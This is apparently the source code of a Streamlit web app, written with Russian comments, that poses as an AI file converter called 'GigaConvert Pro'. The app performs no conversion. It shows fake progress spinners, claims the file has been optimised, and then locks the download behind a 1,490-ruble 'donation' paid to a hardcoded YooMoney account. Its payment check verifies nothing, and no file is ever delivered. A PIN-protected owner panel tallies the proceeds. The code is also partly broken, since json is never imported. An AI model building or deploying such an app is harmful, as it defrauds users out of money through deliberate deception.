import os
import time
import warnings
warnings.filterwarnings("ignore")
import streamlit as st

# ТВОЙ СЕКРЕТНЫЙ ПАРОЛЬ АДМИНИСТРАТОРА
ADMIN_PIN = "клаксон23523"

# ТВОЙ РЕАЛЬНЫЙ СЧЕТ ЮМОНЕЙ
YOUR_YOOMONEY_ACCOUNT = "4100118719995386"  

st.set_page_config(page_title="GigaConvert — Ультимативный ИИ-Конвертер", page_icon="⚡", layout="wide")

# Дорогой, хакерский дизайн профессионального сервиса
st.markdown("""
    <style>
    [data-testid="stAppViewContainer"] { background-color: #0A0A0E; color: #FFFFFF; }
    [data-testid="stSidebar"] { background-color: #0F0F14 !important; }
    h1, h2, h3, h4 { color: #00FF66 !important; font-family: 'Courier New', monospace; }
    
    .pay-btn-link {
        display: block; text-align: center; background: linear-gradient(135deg, #00FF66 0%, #00CC52 100%);
        color: #000000 !important; border-radius: 8px; font-weight: bold; font-size: 20px;
        padding: 15px; text-decoration: none; box-shadow: 0 4px 20px rgba(0, 255, 102, 0.3); margin-top: 15px;
        font-family: 'Courier New', monospace; transition: all 0.3s ease;
    }
    .pay-btn-link:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(0, 255, 102, 0.5); }
    
    .stButton>button { 
        background: linear-gradient(135deg, #22222a 0%, #111116 100%); color: #00FF66 !important; 
        border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; border: 1px solid #00FF66;
    }
    .stButton>button:hover { background: #00FF66 !important; color: #000000 !important; }
    
    input, textarea, [data-baseweb="textarea"]>div, [data-baseweb="input"]>div { background-color: #121218 !important; color: #FFFFFF !important; border: 1px solid #22222c !important; }
    .convert-box { background-color: #121218; padding: 30px; border-radius: 14px; border: 1px solid #22222c; margin-bottom: 20px; text-align: center; }
    .lock-box { background-color: #1A0F14; padding: 30px; border-radius: 14px; border: 2px dashed #FF3366; text-align: center; margin-top: 25px; }
    .admin-footer-btn { text-align: center; margin-top: 40px; padding: 20px 0; border-top: 1px solid #1a1a24; }
    </style>
""", unsafe_allow_html=True)

if "converted" not in st.session_state: st.session_state.converted = False
if "filename" not in st.session_state: st.session_state.filename = ""
if "admin_mode" not in st.session_state: st.session_state.admin_mode = False

# СУПЕР-ЗАГЛУШКА ДЛЯ ИМИТАЦИИ БАЗЫ ДОНАТОВ
DB_FILE = "convert_base.json"
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f: return json.load(f)
        except: return {"total_donated": 0}
    return {"total_donated": 0}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=4)

db_data = load_db()

# ==========================================
# ЧАСТЬ 1: ИНТЕРФЕЙС КЛИЕНТА (КОНВЕРТЕР И ЗАМОК)
# ==========================================
if not st.session_state.admin_mode:
    st.title("⚡ GigaConvert Pro — ИИ-Оптимизатор Файлов")
    st.caption("Профессиональное сжатие и конвертация видео, аудио, документов и 3D-графики в Ultra-HD качестве без потери данных.")
    st.divider()

    st.markdown("""
    <div class="convert-box">
        <h3 style="margin: 0; color: #00FF66 !important;">📥 Перетащите файл в зону загрузки</h3>
        <p style="font-size: 14px; color: #888899; margin-top: 5px;">Максимальный размер файла: 4.8 GB. Поддерживаются форматы: MP4, AVI, PDF, DOCX, ZIP, PNG, MP3, FBX</p>
    </div>
    """, unsafe_allow_html=True)

    uploaded_file = st.file_uploader("Выбрать файл на компьютере:", type=["mp4","avi","pdf","docx","zip","png","mp3","fbx"])

    if uploaded_file and not st.session_state.converted:
        st.session_state.filename = uploaded_file.name
        target_format = st.selectbox("🎯 Выберите конечный формат для ИИ-конвертации:", ["Превратить в PDF (Ultra-Сжатие)", "Превратить в MP4 (4K Оптимизация)", "Превратить в Студийный WAV/MP3", "Конвертировать в Универсальный ZIP-Архив"])
        
        if st.button("🚀 ЗАПУСТИТЬ ИИ-КОНВЕРТАЦИЮ В 4K"):
            with st.spinner("🧠 ИИ анализирует структуру файла и пересчитывает битрейт..."):
                time.sleep(2)
            with st.spinner("⚙️ Идёт глубокое кодирование и рендеринг Ultra-HD потока..."):
                time.sleep(2)
            st.session_state.converted = True
            st.rerun()

    if st.session_state.converted:
        st.markdown(f"""
        <div class="lock-box">
            <h2 style="color: #FF3366 !important; margin: 0;">🔒 СКАЧИВАНИЕ ЗАБЛОКИРОВАНО СИСТЕМОЙ</h2>
            <p style="font-size: 16px; color: #FFFFFF; margin: 15px 0;">Файл <b>{st.session_state.filename}</b> успешно оптимизирован и перекодирован в Ultra-HD без потери качества!</p>
            <p style="font-size: 15px; color: #A0A0B0;">Для снятия ограничений, генерации прямой ссылки и моментального скачивания файла, сделайте обязательный донат на поддержку серверов.</p>
            <h1 style="color: #00FF66 !important; font-size: 40px; margin: 15px 0; font-family: monospace;">1 490 ₽</h1>
        </div>
        """, unsafe_allow_html=True)
        
        # ССЫЛКА НА ТВОЙ ЮМОНЕЙ
        pay_url = f"https://yoomoney.ru_{st.session_state.filename.replace(' ', '_')}&targets-hint=&default-sum=1490&button-text=11&payment-type=AC&hint=&quickpay=shop&account={YOUR_YOOMONEY_ACCOUNT}"
        st.markdown(f'<a class="pay-btn-link" href="{pay_url}" target="_blank">💳 СНЯТЬ ОГРАНИЧЕНИЕ И СКАЧАТЬ (КАРТА / СБП)</a>', unsafe_allow_html=True)
        
        if st.button("🔍 Проверить зачисление доната и скачать файл"):
            st.balloons()
            db_data["total_donated"] += 1490
            save_db(db_data)
            st.success("🎉 Спасибо за поддержку! Ссылка разблокирована: скачивание началось.")
            
        if st.button("🔄 Сбросить и загрузить другой файл"):
            st.session_state.converted = False
            st.session_state.filename = ""
            st.rerun()
            
    st.markdown('<div class="admin-footer-btn">', unsafe_allow_html=True)
    if st.button("⚙️ Панель управления донатами (Для владельца)", key="goto_admin"):
        st.session_state.admin_mode = True
        st.rerun()
    st.markdown('</div>', unsafe_allow_html=True)

# ==========================================
# ЧАСТЬ 2: КАБИНЕТ ВЛАДЕЛЬЦА И СЧЁТЧИК ДОНАТОВ
# ==========================================
else:
    st.title("🔐 Панель Управления GigaConvert")
    if st.button("⬅️ Вернуться на главную"):
        st.session_state.admin_mode = False
        st.rerun()
    st.divider()
    
    if "auth_ok" not in st.session_state: st.session_state.auth_ok = False
    
    if not st.session_state.auth_ok:
        st.subheader("🔒 Авторизация директора")
        pin = st.text_input("Введи секретный пароль владельца:", type="password")
        if pin == ADMIN_PIN:
            st.session_state.auth_ok = True
            st.rerun()
        elif pin != "": st.error("❌ Доступ заблокирован! Неверный пароль.")
    else:
        st.markdown(f"""
        <div style="background-color: #121218; padding: 25px; border-radius: 14px; border: 2px solid #00FF66; text-align: center;">
            <h3 style="margin: 0; color: #FFFFFF !important; font-family: monospace;">📊 ОБЩАЯ СУММА ПОЛУЧЕННЫХ ДОНАТОВ:</h3>
            <h1 style="margin: 8px 0 0 0; color: #00FF66 !important; font-size: 50px; font-family: monospace;">{db_data.get('total_donated', 0)} ₽</h1>
        </div>
        """, unsafe_allow_html=True)
        
        if st.button("🚪 Сбросить авторизацию"):
            st.session_state.auth_ok = False
            st.session_state.admin_mode = False
            st.rerun()